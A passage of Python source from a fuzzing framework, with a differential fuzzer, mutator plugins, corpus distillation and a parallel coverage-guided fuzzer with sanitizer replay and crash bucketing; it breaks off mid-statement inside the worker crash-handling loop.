            "input_hash": hashlib.md5(self.input_data).hexdigest()[:16],
            "input_size": len(self.input_data),
            "is_divergent": self.is_divergent,
            "divergence_type": self.divergence_type,
            "results": {
                name: {
                    "exit_code": r.exit_code,
                    "crashed": r.crashed,
                    "timed_out": r.timed_out,
                    "stdout_len": len(r.stdout),
                    "stderr_len": len(r.stderr),
                }
                for name, r in self.results.items()
            },
        }


class DifferentialFuzzer:
    """
    Differential fuzzer that compares behavior across multiple implementations.
    
    Useful for:
    - Finding bugs in one implementation vs reference
    - Security differences between versions
    - Compiler/interpreter inconsistencies
    """
    
    def __init__(
        self,
        targets: List[DifferentialTarget],
        timeout_ms: int = 5000,
    ):
        if len(targets) < 2:
            raise ValueError("Differential fuzzing requires at least 2 targets")
        
        self.targets = targets
        self.timeout_ms = timeout_ms
        self.harnesses = {
            t.name: ProcessHarness(t.path, t.args, timeout_ms, t.env)
            for t in targets
        }
        self.divergences: List[DifferentialResult] = []
        self.stats = {
            "total_inputs": 0,
            "divergent_inputs": 0,
            "exit_code_divergences": 0,
            "crash_divergences": 0,
            "timeout_divergences": 0,
            "output_divergences": 0,
        }
    
    async def fuzz(
        self,
        seed_inputs: List[bytes],
        mutation_engine: MutationEngine,
        num_iterations: int = 1000,
    ) -> AsyncGenerator[DifferentialResult, None]:
        """
        Run differential fuzzing.
        
        Args:
            seed_inputs: Initial input corpus
            mutation_engine: Mutation engine
            num_iterations: Number of iterations
            
        Yields:
            DifferentialResult for each divergent input
        """
        for i in range(num_iterations):
            # Select and mutate input
            seed = random.choice(seed_inputs) if seed_inputs else b'test'
            input_data = mutation_engine.mutate(seed)
            
            # Run on all targets
            results = {}
            for name, harness in self.harnesses.items():
                results[name] = await harness.execute(input_data)
            
            self.stats["total_inputs"] += 1
            
            # Check for divergence
            result = DifferentialResult(
                input_data=input_data,
                results=results,
            )
            
            divergence = self._check_divergence(results)
            if divergence:
                result.is_divergent = True
                result.divergence_type = divergence
                self.divergences.append(result)
                self.stats["divergent_inputs"] += 1
                self.stats[f"{divergence}_divergences"] += 1
                yield result
    
    def _check_divergence(self, results: Dict[str, "ExecutionResult"]) -> Optional[str]:
        """Check if results diverge across targets."""
        result_list = list(results.values())
        
        # Check crash divergence
        crashes = [r.crashed for r in result_list]
        if len(set(crashes)) > 1:
            return "crash"
        
        # Check timeout divergence
        timeouts = [r.timed_out for r in result_list]
        if len(set(timeouts)) > 1:
            return "timeout"
        
        # Check exit code divergence
        exit_codes = [r.exit_code for r in result_list if r.exit_code is not None]
        if len(set(exit_codes)) > 1:
            return "exit_code"
        
        # Check output divergence (significant differences)
        if len(result_list) >= 2:
            stdouts = [r.stdout for r in result_list]
            # Compare lengths as proxy for content difference
            lengths = [len(s) for s in stdouts]
            if max(lengths) > 0:
                ratio = min(lengths) / max(lengths)
                if ratio < 0.5:  # More than 2x difference
                    return "output"
        
        return None
    
    def get_stats(self) -> Dict[str, Any]:
        """Get differential fuzzing statistics."""
        return {
            **self.stats,
            "targets": [t.name for t in self.targets],
            "divergence_rate": (
                self.stats["divergent_inputs"] / max(1, self.stats["total_inputs"])
            ) * 100,
        }
    
    def get_divergences(self) -> List[Dict[str, Any]]:
        """Get all divergent results."""
        return [d.to_dict() for d in self.divergences]
    
    def cleanup(self):
        """Clean up resources."""
        for harness in self.harnesses.values():
            harness.cleanup()


# =============================================================================
# CUSTOM MUTATOR PLUGIN SYSTEM (Medium Priority - Phase 6)
# =============================================================================

class MutatorPlugin:
    """
    Base class for custom mutator plugins.
    
    Subclass this to create custom mutation strategies.
    """
    
    name: str = "base_mutator"
    description: str = "Base mutator plugin"
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        self.config = config or {}
        self.mutation_count = 0
    
    def mutate(self, data: bytes) -> bytes:
        """
        Mutate the input data.
        
        Override this method to implement custom mutation logic.
        
        Args:
            data: Input bytes to mutate
            
        Returns:
            Mutated bytes
        """
        raise NotImplementedError("Subclasses must implement mutate()")
    
    def get_stats(self) -> Dict[str, Any]:
        """Get mutation statistics."""
        return {
            "name": self.name,
            "mutation_count": self.mutation_count,
        }


class MagicByteMutator(MutatorPlugin):
    """Mutator that targets magic bytes and file signatures."""
    
    name = "magic_byte"
    description = "Targets file format magic bytes and signatures"
    
    # Common file format signatures
    MAGIC_BYTES = {
        "pdf": b"%PDF",
        "png": b"\x89PNG\r\n\x1a\n",
        "gif": b"GIF89a",
        "jpeg": b"\xff\xd8\xff",
        "zip": b"PK\x03\x04",
        "gzip": b"\x1f\x8b",
        "elf": b"\x7fELF",
        "pe": b"MZ",
        "bmp": b"BM",
        "wav": b"RIFF",
    }
    
    def mutate(self, data: bytes) -> bytes:
        self.mutation_count += 1
        
        data = bytearray(data)
        
        # Identify format
        detected_format = None
        for fmt, magic in self.MAGIC_BYTES.items():
            if data[:len(magic)] == bytearray(magic):
                detected_format = fmt
                break
        
        mutation_type = random.choice(['corrupt_magic', 'swap_magic', 'partial_magic', 'extend_magic'])
        
        if mutation_type == 'corrupt_magic' and detected_format:
            # Corrupt one byte of magic
            magic_len = len(self.MAGIC_BYTES[detected_format])
            pos = random.randint(0, min(magic_len - 1, len(data) - 1))
            data[pos] ^= random.randint(1, 255)
        
        elif mutation_type == 'swap_magic':
            # Replace with different format's magic
            new_magic = random.choice(list(self.MAGIC_BYTES.values()))
            for i, b in enumerate(new_magic):
                if i < len(data):
                    data[i] = b
        
        elif mutation_type == 'partial_magic':
            # Truncate magic bytes
            if len(data) > 2:
                truncate_at = random.randint(1, min(4, len(data) - 1))
                data = data[truncate_at:]
        
        elif mutation_type == 'extend_magic':
            # Add extra bytes after magic
            if detected_format:
                magic_len = len(self.MAGIC_BYTES[detected_format])
                insert_pos = min(magic_len, len(data))
                extra = bytes(random.randint(0, 255) for _ in range(random.randint(1, 10)))
                data = data[:insert_pos] + bytearray(extra) + data[insert_pos:]
        
        return bytes(data)


class LengthFieldMutator(MutatorPlugin):
    """Mutator that targets length fields in binary formats."""
    
    name = "length_field"
    description = "Targets length/size fields in binary formats"
    
    def mutate(self, data: bytes) -> bytes:
        self.mutation_count += 1
        
        if len(data) < 4:
            return data
        
        data = bytearray(data)
        
        # Find potential length fields (values that could be lengths)
        potential_lengths = []
        
        # Check for 2-byte lengths
        for i in range(0, len(data) - 1):
            val_le = struct.unpack_from('<H', data, i)[0]
            val_be = struct.unpack_from('>H', data, i)[0]
            
            for val in [val_le, val_be]:
                if 1 <= val <= len(data) * 2:
                    potential_lengths.append((i, 2, val))
        
        # Check for 4-byte lengths
        for i in range(0, len(data) - 3):
            val_le = struct.unpack_from('<I', data, i)[0]
            val_be = struct.unpack_from('>I', data, i)[0]
            
            for val in [val_le, val_be]:
                if 1 <= val <= len(data) * 2:
                    potential_lengths.append((i, 4, val))
        
        if not potential_lengths:
            return bytes(data)
        
        # Mutate a random potential length field
        pos, size, original_val = random.choice(potential_lengths)
        
        mutation_type = random.choice(['overflow', 'underflow', 'zero', 'max', 'negative'])
        
        if mutation_type == 'overflow':
            new_val = original_val + random.randint(1, 1000)
        elif mutation_type == 'underflow':
            new_val = max(0, original_val - random.randint(1, original_val))
        elif mutation_type == 'zero':
            new_val = 0
        elif mutation_type == 'max':
            new_val = (2 ** (size * 8)) - 1
        else:  # negative (as unsigned)
            new_val = (2 ** (size * 8)) - random.randint(1, 100)
        
        # Write mutated value
        if size == 2:
            struct.pack_into('<H', data, pos, new_val & 0xFFFF)
        else:
            struct.pack_into('<I', data, pos, new_val & 0xFFFFFFFF)
        
        return bytes(data)


class BoundaryMutator(MutatorPlugin):
    """Mutator that inserts boundary values at strategic positions."""
    
    name = "boundary"
    description = "Inserts boundary values (0, -1, max int, etc.)"
    
    BOUNDARIES = {
        1: [0, 1, 0x7F, 0x80, 0xFF],
        2: [0, 1, 0x7FFF, 0x8000, 0xFFFF],
        4: [0, 1, 0x7FFFFFFF, 0x80000000, 0xFFFFFFFF],
        8: [0, 1, 0x7FFFFFFFFFFFFFFF, 0x8000000000000000, 0xFFFFFFFFFFFFFFFF],
    }
    
    def mutate(self, data: bytes) -> bytes:
        self.mutation_count += 1
        
        if len(data) < 1:
            return data
        
        data = bytearray(data)
        
        # Choose a size and position
        size = random.choice([1, 2, 4])
        if len(data) < size:
            size = len(data)
        
        pos = random.randint(0, len(data) - size)
        value = random.choice(self.BOUNDARIES.get(size, [0, 255]))
        
        # Write boundary value
        for i in range(size):
            if pos + i < len(data):
                data[pos + i] = (value >> (i * 8)) & 0xFF
        
        return bytes(data)


class MutatorPluginManager:
    """
    Manages custom mutator plugins.
    
    Allows loading, registering, and using custom mutation strategies.
    """
    
    def __init__(self):
        self.plugins: Dict[str, MutatorPlugin] = {}
        self._register_builtin_plugins()
    
    def _register_builtin_plugins(self):
        """Register built-in mutator plugins."""
        self.register(MagicByteMutator())
        self.register(LengthFieldMutator())
        self.register(BoundaryMutator())
    
    def register(self, plugin: MutatorPlugin):
        """Register a mutator plugin."""
        self.plugins[plugin.name] = plugin
        logger.info(f"Registered mutator plugin: {plugin.name}")
    
    def get_plugin(self, name: str) -> Optional[MutatorPlugin]:
        """Get a plugin by name."""
        return self.plugins.get(name)
    
    def list_plugins(self) -> List[Dict[str, str]]:
        """List all registered plugins."""
        return [
            {"name": p.name, "description": p.description}
            for p in self.plugins.values()
        ]
    
    def mutate(self, data: bytes, plugin_name: Optional[str] = None) -> bytes:
        """
        Mutate data using a plugin.
        
        Args:
            data: Input data
            plugin_name: Specific plugin to use, or random if None
            
        Returns:
            Mutated data
        """
        if plugin_name:
            plugin = self.plugins.get(plugin_name)
            if plugin:
                return plugin.mutate(data)
            return data
        
        # Random plugin
        if self.plugins:
            plugin = random.choice(list(self.plugins.values()))
            return plugin.mutate(data)
        
        return data
    
    def get_stats(self) -> Dict[str, Any]:
        """Get statistics for all plugins."""
        return {
            "total_plugins": len(self.plugins),
            "plugins": {
                name: plugin.get_stats()
                for name, plugin in self.plugins.items()
            },
        }


# =============================================================================
# CORPUS DISTILLATION (Medium Priority - Phase 6)
# =============================================================================

class CorpusDistiller:
    """
    Minimize corpus to smallest set that maintains coverage.
    
    Uses coverage information to identify redundant inputs
    and keep only the most efficient ones.
    """
    
    def __init__(
        self,
        coverage_tracker: 'CoverageTracker',
        harness: 'ProcessHarness',
    ):
        self.coverage_tracker = coverage_tracker
        self.harness = harness
        self.stats = {
            "original_size": 0,
            "distilled_size": 0,
            "inputs_evaluated": 0,
            "coverage_preserved": 0.0,
        }
    
    async def distill(
        self,
        corpus: List[bytes],
        strategy: str = "greedy",
    ) -> List[bytes]:
        """
        Distill corpus to minimal set.
        
        Args:
            corpus: Original corpus inputs
            strategy: Distillation strategy (greedy, minset, weighted)
            
        Returns:
            Minimized corpus
        """
        self.stats["original_size"] = len(corpus)
        
        if not corpus:
            return []
        
        if strategy == "greedy":
            result = await self._greedy_distill(corpus)
        elif strategy == "minset":
            result = await self._minset_distill(corpus)
        elif strategy == "weighted":
            result = await self._weighted_distill(corpus)
        else:
            result = corpus
        
        self.stats["distilled_size"] = len(result)
        self.stats["coverage_preserved"] = await self._measure_coverage(result)
        
        return result
    
    async def _greedy_distill(self, corpus: List[bytes]) -> List[bytes]:
        """
        Greedy distillation - keep inputs that add new coverage.
        
        Time complexity: O(n * execution_time)
        """
        result = []
        covered_edges: Set[int] = set()
        
        # Sort by size (prefer smaller inputs)
        sorted_corpus = sorted(corpus, key=len)
        
        for input_data in sorted_corpus:
            self.stats["inputs_evaluated"] += 1
            
            # Execute and get coverage
            exec_result = await self.harness.execute(input_data)
            
            # Get coverage bitmap (simplified - would need real instrumentation)
            new_edges = self._get_coverage_edges(exec_result)
            
            # Check if this input covers new edges
            new_coverage = new_edges - covered_edges
            if new_coverage:
                result.append(input_data)
                covered_edges.update(new_edges)
        
        return result
    
    async def _minset_distill(self, corpus: List[bytes]) -> List[bytes]:
        """
        Minimum set cover distillation.
        
        Finds minimum number of inputs that cover all edges.
        Uses greedy approximation (optimal is NP-hard).
        """
        # First pass: collect coverage for all inputs
        coverage_map: Dict[int, Set[int]] = {}  # input_idx -> covered_edges
        all_edges: Set[int] = set()
        
        for idx, input_data in enumerate(corpus):
            self.stats["inputs_evaluated"] += 1
            exec_result = await self.harness.execute(input_data)
            edges = self._get_coverage_edges(exec_result)
            coverage_map[idx] = edges
            all_edges.update(edges)
        
        # Greedy set cover
        result_indices: List[int] = []
        uncovered = all_edges.copy()
        
        while uncovered:
            # Find input that covers most uncovered edges
            best_idx = -1
            best_coverage = 0
            
            for idx, edges in coverage_map.items():
                if idx in result_indices:
                    continue
                
                coverage = len(edges & uncovered)
                if coverage > best_coverage:
                    best_coverage = coverage
                    best_idx = idx
            
            if best_idx < 0:
                break
            
            result_indices.append(best_idx)
            uncovered -= coverage_map[best_idx]
        
        return [corpus[i] for i in result_indices]
    
    async def _weighted_distill(self, corpus: List[bytes]) -> List[bytes]:
        """
        Weighted distillation - balance coverage vs input size.
        
        Prefers inputs with high coverage-to-size ratio.
        """
        # Calculate efficiency scores
        scored_inputs: List[Tuple[float, int, bytes]] = []
        
        for idx, input_data in enumerate(corpus):
            self.stats["inputs_evaluated"] += 1
            exec_result = await self.harness.execute(input_data)
            edges = self._get_coverage_edges(exec_result)
            
            # Efficiency = coverage / size
            size = max(1, len(input_data))
            efficiency = len(edges) / size
            scored_inputs.append((efficiency, idx, input_data))
        
        # Sort by efficiency (descending)
        scored_inputs.sort(key=lambda x: -x[0])
        
        # Greedy selection
        result = []
        covered_edges: Set[int] = set()
        
        for efficiency, idx, input_data in scored_inputs:
            exec_result = await self.harness.execute(input_data)
            edges = self._get_coverage_edges(exec_result)
            
            new_coverage = edges - covered_edges
            if new_coverage:
                result.append(input_data)
                covered_edges.update(edges)
        
        return result
    
    def _get_coverage_edges(self, result: 'ExecutionResult') -> Set[int]:
        """
        Extract coverage edges from execution result.
        
        In practice, this would read from coverage instrumentation.
        """
        if result.coverage_data:
            return {i for i, hit in enumerate(result.coverage_data) if hit}
        
        # Simplified fallback: hash stderr/stdout as proxy for coverage
        edges = set()
        
        if result.stdout:
            edges.add(hash(result.stdout) % 65536)
        if result.stderr:
            edges.add(hash(result.stderr) % 65536)
        if result.exit_code is not None:
            edges.add(result.exit_code)
        
        return edges
    
    async def _measure_coverage(self, corpus: List[bytes]) -> float:
        """Measure total coverage of corpus."""
        all_edges: Set[int] = set()
        
        for input_data in corpus:
            result = await self.harness.execute(input_data)
            edges = self._get_coverage_edges(result)
            all_edges.update(edges)
        
        return len(all_edges)
    
    def get_stats(self) -> Dict[str, Any]:
        """Get distillation statistics."""
        reduction = 0.0
        if self.stats["original_size"] > 0:
            reduction = (1 - self.stats["distilled_size"] / self.stats["original_size"]) * 100
        
        return {
            **self.stats,
            "reduction_percentage": round(reduction, 2),
        }


# =============================================================================
# PARALLEL/DISTRIBUTED FUZZING (Low Priority - Phase 7)
# =============================================================================

@dataclass
class WorkerStats:
    """Statistics for a single fuzzing worker."""
    worker_id: int
    executions: int = 0
    crashes: int = 0
    unique_crashes: int = 0
    coverage_edges: int = 0
    exec_per_sec: float = 0.0
    last_update: str = ""
    status: str = "idle"


@dataclass
class ParallelFuzzingSession:
    """Session state for parallel fuzzing."""
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    target_path: str = ""
    num_workers: int = 1
    status: str = "initializing"
    started_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    total_executions: int = 0
    total_crashes: int = 0
    unique_crashes: int = 0
    total_coverage_edges: int = 0
    coverage_percentage: float = 0.0
    corpus_size: int = 0
    favored_inputs: int = 0
    new_coverage_inputs: int = 0
    scheduler_strategy: str = "power_schedule"
    execution_mode: str = ExecutionMode.PROCESS.value
    coverage_backend: str = CoverageBackend.NONE.value
    coverage_map_size: int = 65536
    coverage_available: bool = False
    coverage_warning: Optional[str] = None
    memory_errors_detected: int = 0
    heap_errors: int = 0
    stack_errors: int = 0
    uaf_errors: int = 0
    exploitable_errors: int = 0
    sanitizer_replay_enabled: bool = False
    sanitizer_warning: Optional[str] = None
    sanitizer_runs: int = 0
    sanitizer_max_runs: int = 0
    sanitizer_target_path: Optional[str] = None
    workers: Dict[int, WorkerStats] = field(default_factory=dict)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "id": self.id,
            "target_path": self.target_path,
            "num_workers": self.num_workers,
            "status": self.status,
            "started_at": self.started_at,
            "total_executions": self.total_executions,
            "total_crashes": self.total_crashes,
            "unique_crashes": self.unique_crashes,
            "total_coverage_edges": self.total_coverage_edges,
            "coverage_percentage": self.coverage_percentage,
            "corpus_size": self.corpus_size,
            "favored_inputs": self.favored_inputs,
            "new_coverage_inputs": self.new_coverage_inputs,
            "scheduler_strategy": self.scheduler_strategy,
            "execution_mode": self.execution_mode,
            "coverage_backend": self.coverage_backend,
            "coverage_map_size": self.coverage_map_size,
            "coverage_available": self.coverage_available,
            "coverage_warning": self.coverage_warning,
            "memory_errors_detected": self.memory_errors_detected,
            "heap_errors": self.heap_errors,
            "stack_errors": self.stack_errors,
            "uaf_errors": self.uaf_errors,
            "exploitable_errors": self.exploitable_errors,
            "sanitizer_replay_enabled": self.sanitizer_replay_enabled,
            "sanitizer_warning": self.sanitizer_warning,
            "sanitizer_runs": self.sanitizer_runs,
            "sanitizer_max_runs": self.sanitizer_max_runs,
            "sanitizer_target_path": self.sanitizer_target_path,
            "workers": {k: asdict(v) for k, v in self.workers.items()},
        }


class ParallelFuzzer:
    """
    Parallel fuzzing across multiple CPU cores.
    
    Features:
    - Work stealing between workers
    - Shared corpus with synchronization
    - Aggregated crash database
    - Coverage bitmap merging
    """
    
    def __init__(
        self,
        target_path: str,
        target_args: str = "@@",
        num_workers: Optional[int] = None,
        seed_dir: Optional[str] = None,
        output_dir: Optional[str] = None,
        timeout_ms: int = 5000,
        sync_interval_seconds: float = 30.0,
        coverage_guided: bool = True,
        scheduler_strategy: str = "power_schedule",
        use_stdin: Optional[bool] = None,
        coverage_backend: str = "auto",
        coverage_map_size: int = 65536,
        dictionary: Optional[List[bytes]] = None,
        enable_compcov: bool = True,
        sanitizer_target_path: Optional[str] = None,
        sanitizer_timeout_ms: int = 5000,
        sanitizer_max_runs: int = 10,
    ):
        self.target_path = target_path
        self.target_args = target_args
        self.num_workers = num_workers or os.cpu_count() or 4
        self.seed_dir = seed_dir
        self.output_dir = output_dir or tempfile.mkdtemp(prefix="parallel_fuzz_")
        self.timeout_ms = timeout_ms
        self.sync_interval = sync_interval_seconds
        self.coverage_guided = coverage_guided
        self.scheduler_strategy = scheduler_strategy
        self.use_stdin = use_stdin
        self.coverage_map_size = coverage_map_size
        self.enable_compcov = enable_compcov
        self.dictionary = dictionary or []
        
        self.session = ParallelFuzzingSession(
            target_path=target_path,
            num_workers=self.num_workers,
        )
        self.session.scheduler_strategy = scheduler_strategy
        self.session.coverage_map_size = coverage_map_size

        try:
            self.coverage_backend = CoverageBackend(coverage_backend)
        except ValueError:
            self.coverage_backend = CoverageBackend.AUTO
        self.session.coverage_backend = self.coverage_backend.value
        
        self.coverage_provider_available = False
        if self.coverage_guided:
            probe = create_coverage_provider(self.coverage_backend, map_size=coverage_map_size)
            if probe:
                self.coverage_provider_available = True
                if self.coverage_backend == CoverageBackend.AUTO:
                    self.coverage_backend = CoverageBackend.AFL_SHM
                    self.session.coverage_backend = self.coverage_backend.value
                probe.close()
            else:
                self.coverage_backend = CoverageBackend.NONE
                self.coverage_guided = False
                self.session.coverage_backend = self.coverage_backend.value
                self.session.coverage_warning = "Coverage backend unavailable. Target may be uninstrumented."
        self.session.coverage_available = False

        self.coverage_tracker = CoverageTracker(bitmap_size=coverage_map_size)
        corpus_dir = os.path.join(self.output_dir, "corpus")
        self.corpus_manager = CorpusManager(corpus_dir)
        try:
            strategy = SeedScheduler.Strategy(scheduler_strategy)
        except ValueError:
            strategy = SeedScheduler.Strategy.POWER_SCHEDULE
        self.scheduler = SeedScheduler(self.corpus_manager, self.coverage_tracker, strategy)

        self.crash_db = CrashDatabase(os.path.join(self.output_dir, "crashes"))
        self.memory_safety_analyzer = MemorySafetyAnalyzer()

        self.coverage_zero_streak = 0
        self.coverage_zero_threshold = 50 * max(1, self.num_workers)
        self.coverage_unavailable_emitted = False

        self.sanitizer_runner: Optional[SanitizerReplay] = None
        if sanitizer_target_path:
            if sanitizer_max_runs <= 0:
                self.session.sanitizer_warning = "Sanitizer replay disabled (max runs set to 0)."
            elif os.path.isfile(sanitizer_target_path):
                self.sanitizer_runner = SanitizerReplay(
                    target_path=sanitizer_target_path,
                    target_args=target_args,
                    timeout_ms=sanitizer_timeout_ms,
                    use_stdin=use_stdin,
                    max_runs=sanitizer_max_runs,
                )
                self.session.sanitizer_replay_enabled = True
                self.session.sanitizer_max_runs = sanitizer_max_runs
                self.session.sanitizer_target_path = sanitizer_target_path
            else:
                self.session.sanitizer_warning = f"Sanitizer target not found: {sanitizer_target_path}"

        # Shared state
        self._workers: List[asyncio.Task] = []
        self._seed_inputs: List[bytes] = []
        self._shared_crashes: Dict[str, Dict[str, Any]] = {}
        self._lock = asyncio.Lock()
        self._event_queue: asyncio.Queue = asyncio.Queue(maxsize=1000)
        self._running = False
        self._cancel_event = asyncio.Event()
        
        # Initialize worker directories
        for i in range(self.num_workers):
            worker_dir = os.path.join(self.output_dir, f"worker_{i}")
            os.makedirs(worker_dir, exist_ok=True)
            self.session.workers[i] = WorkerStats(worker_id=i)
    
    async def start(
        self,
        max_iterations: Optional[int] = None,
        max_time_seconds: Optional[int] = None,
    ) -> AsyncGenerator[Dict[str, Any], None]:
        """
        Start parallel fuzzing.
        
        Args:
            max_iterations: Max executions per worker
            max_time_seconds: Max runtime
            
        Yields:
            Progress events
        """
        self._running = True
        self.session.status = "running"
        self.session.started_at = datetime.utcnow().isoformat()
        
        yield {
            "type": "session_start",
            "session_id": self.session.id,
            "num_workers": self.num_workers,
            "target": self.target_path,
            "coverage_guided": self.coverage_guided,
            "scheduler_strategy": self.session.scheduler_strategy,
            "coverage_backend": self.session.coverage_backend,
            "coverage_map_size": self.session.coverage_map_size,
            "coverage_warning": self.session.coverage_warning,
            "sanitizer_replay_enabled": self.session.sanitizer_replay_enabled,
            "sanitizer_warning": self.session.sanitizer_warning,
            "sanitizer_target_path": self.session.sanitizer_target_path,
        }
        
        # Load seeds
        await self._load_seeds()

        if self.session.coverage_warning:
            self._queue_event({
                "type": "coverage_unavailable",
                "coverage_backend": self.session.coverage_backend,
                "map_size": self.session.coverage_map_size,
                "message": self.session.coverage_warning,
            })
        
        # Start workers
        start_time = time.time()
        
        for i in range(self.num_workers):
            task = asyncio.create_task(
                self._worker_loop(i, max_iterations, max_time_seconds)
            )
            self._workers.append(task)
        
        # Monitor and yield progress
        try:
            while self._running:
                # Check time limit
                if max_time_seconds and (time.time() - start_time) >= max_time_seconds:
                    break
                
                # Check if all workers done
                if all(w.done() for w in self._workers):
                    break
                
                # Drain queued events
                while True:
                    try:
                        event = self._event_queue.get_nowait()
                    except asyncio.QueueEmpty:
                        break
                    else:
                        yield event

                # Aggregate stats
                self._aggregate_stats()
                
                yield {
                    "type": "parallel_stats",
                    "session": self.session.to_dict(),
                    "elapsed_seconds": time.time() - start_time,
                }
                
                await asyncio.sleep(2.0)
        
        finally:
            self._running = False
            self._cancel_event.set()
            
            # Cancel workers
            for w in self._workers:
                if not w.done():
                    w.cancel()
            
            # Final stats
            self._aggregate_stats()
            self.session.status = "completed"
            if self.sanitizer_runner:
                self.sanitizer_runner.cleanup()
            
            yield {
                "type": "session_end",
                "session": self.session.to_dict(),
                "crashes": [b.to_dict() for b in self.crash_db.get_all_buckets()],
            }
    
    async def _load_seeds(self):
        """Load seed inputs into shared corpus."""
        if self.seed_dir and os.path.isdir(self.seed_dir):
            for filename in os.listdir(self.seed_dir):
                filepath = os.path.join(self.seed_dir, filename)
                if os.path.isfile(filepath):
                    with open(filepath, "rb") as f:
                        data = f.read()
                        if len(data) <= 1024 * 1024:
                            self._seed_inputs.append(data)
                            if data[:64] not in self.dictionary:
                                self.dictionary.append(data[:64])
                            self.corpus_manager.add(data, mutation_type="seed")
        
        if not self._seed_inputs:
            default_seed = b"FUZZ"
            self._seed_inputs.append(default_seed)
            self.corpus_manager.add(default_seed, mutation_type="seed")

        self.session.corpus_size = len(self.corpus_manager.entries) or len(self._seed_inputs)

    def _queue_event(self, event: Dict[str, Any]):
        """Queue an event from workers without blocking fuzzing."""
        try:
            self._event_queue.put_nowait(event)
        except asyncio.QueueFull:
            pass

    async def _run_sanitizer_replay(self, input_data: bytes) -> List[MemoryError]:
        """Re-run input against sanitizer build to enrich crash triage."""
        if not self.sanitizer_runner:
            return []
        result = await self.sanitizer_runner.replay(input_data)
        if not result:
            return []
        combined_output = (
            result.stderr.decode("utf-8", errors="replace") +
            result.stdout.decode("utf-8", errors="replace")
        )
        return self.memory_safety_analyzer.sanitizer_parser.parse_any(combined_output)
    
    async def _worker_loop(
        self,
        worker_id: int,
        max_iterations: Optional[int],
        max_time_seconds: Optional[int],
    ):
        """Worker fuzzing loop."""
        worker_stats = self.session.workers[worker_id]
        worker_stats.status = "running"
        worker_dir = os.path.join(self.output_dir, f"worker_{worker_id}")
        
        harness_env: Dict[str, str] = {}
        if self.enable_compcov:
            harness_env["AFL_COMPCOV_LEVEL"] = "2"

        coverage_provider = None
        if self.coverage_guided and self.coverage_backend != CoverageBackend.NONE:
            coverage_provider = create_coverage_provider(
                self.coverage_backend,
                map_size=self.coverage_map_size,
            )

        # Create worker-specific fuzzer
        harness = ProcessHarness(
            target_path=self.target_path,
            args_template=self.target_args,
            timeout_ms=self.timeout_ms,
            use_stdin=self.use_stdin,
            environment=harness_env,
            coverage_provider=coverage_provider,
        )
        mutation_engine = MutationEngine(self.dictionary)
        crash_analyzer = CrashAnalyzer(
            target_path=self.target_path,
            target_args=self.target_args,
            use_stdin=self.use_stdin,
            enable_debugger=False,
        )
        
        start_time = time.time()
        iteration = 0
        
        try:
            while self._running and not self._cancel_event.is_set():
                # Check limits
                if max_iterations and iteration >= max_iterations:
                    break
                if max_time_seconds and (time.time() - start_time) >= max_time_seconds:
                    break
                
                iteration += 1
                
                # Get input (work stealing from shared corpus)
                entry = None
                async with self._lock:
                    if self.coverage_guided and self.corpus_manager.entries:
                        entry = self.scheduler.next()

                if entry:
                    base_input = entry.data
                    parent_id = entry.id
                else:
                    base_input = random.choice(self._seed_inputs) if self._seed_inputs else b"FUZZ"
                    parent_id = None
                
                # Mutate
                mutated, mutation_type = mutation_engine.mutate_with_info(base_input)
                
                # Execute
                result = await harness.execute(mutated)
                
                worker_stats.executions += 1
                worker_stats.exec_per_sec = iteration / max(1, time.time() - start_time)
                worker_stats.last_update = datetime.utcnow().isoformat()

                coverage_has_hits = bool(result.coverage_data and any(result.coverage_data))
                coverage_info = None
                found_new_coverage = False

                if self.coverage_guided and coverage_provider:
                    async with self._lock:
                        if coverage_has_hits:
                            if not self.session.coverage_available:
                                self.session.coverage_available = True
                                self.session.coverage_warning = None
                            self.coverage_zero_streak = 0
                        else:
                            self.coverage_zero_streak += 1
                            if (
                                self.coverage_zero_streak >= self.coverage_zero_threshold
                                and not self.coverage_unavailable_emitted
                            ):
                                self.coverage_unavailable_emitted = True
                                self.session.coverage_available = False
                                self.session.coverage_warning = (
                                    f"No coverage data observed after {self.coverage_zero_threshold} executions. "
                                    "Target is likely uninstrumented or using an incompatible map size."
                                )
                                self._queue_event({
                                    "type": "coverage_unavailable",
                                    "coverage_backend": self.session.coverage_backend,
                                    "map_size": self.session.coverage_map_size,
                                    "message": self.session.coverage_warning,
                                })

                        if coverage_has_hits:
                            coverage_info = self.coverage_tracker.process_coverage(result.coverage_data)
                            found_new_coverage = (
                                coverage_info.new_edges > 0 or coverage_info.new_blocks > 0
                            )
                            worker_stats.coverage_edges = coverage_info.edge_count

                            if found_new_coverage:
                                added, new_entry = self.corpus_manager.add(
                                    mutated,
                                    coverage=coverage_info,
                                    parent_id=parent_id,
                                    mutation_type=mutation_type,
                                )
                                if added:
                                    self.session.new_coverage_inputs += 1
                                    self.session.corpus_size = len(self.corpus_manager.entries)
                                    self.session.favored_inputs = len(self.corpus_manager.get_favored())
                                    self._queue_event({
                                        "type": "new_coverage",
                                        "iteration": iteration,
                                        "new_edges": coverage_info.new_edges,
                                        "total_edges": self.coverage_tracker.total_edges_discovered,
                                        "corpus_size": self.session.corpus_size,
                                        "input_id": new_entry.id if new_entry else None,
                                        "worker_id": worker_id,
                                    })

                            if parent_id:
                                self.scheduler.update_score(
                                    parent_id,
                                    found_new_coverage,
                                    result.crashed,
                                    exec_time_ms=result.duration_ms,
                                )
                                self.corpus_manager.record_execution(
                                    parent_id,
                                    result.crashed,
                                    exec_time_ms=result.duration_ms,
                                )

                            self.session.total_coverage_edges = self.coverage_tracker.total_edges_discovered
                            self.session.coverage_percentage = self.coverage_tracker.get_coverage_percentage()

                if self.coverage_guided and parent_id and not coverage_has_hits:
                    async with self._lock:
                        self.scheduler.update_score(
                            parent_id,
                            found_new_coverage,
                            result.crashed,
                            exec_time_ms=result.duration_ms,
                        )
                        self.corpus_manager.record_execution(
                            parent_id,
                            result.crashed,
                            exec_time_ms=result.duration_ms,
                        )
                
                # Handle crash
                if result.crashed:
                    worker_stats.crashes += 1
                    crash_info = crash_analyzer.analyze(result, mutated)

                    memory_errors = []
                    if self.coverage_guided or self.sanitizer_runner:
                        memory_errors = self.memory_safety_analyzer.analyze_crash(
                            result, crash_info
                        )

                    async with self._lock:
                        is_new, bucket_id = self.crash_db.add_crash(crash_info)
                        if is_new:
                            worker_stats.unique_crashes += 1
                            self._shared_crashes[crash_info.input_hash] = {
                                "crash_id": crash_info.id,
                                "bucket_id": bucket_id,
                                "type": crash_info.crash_type.value,
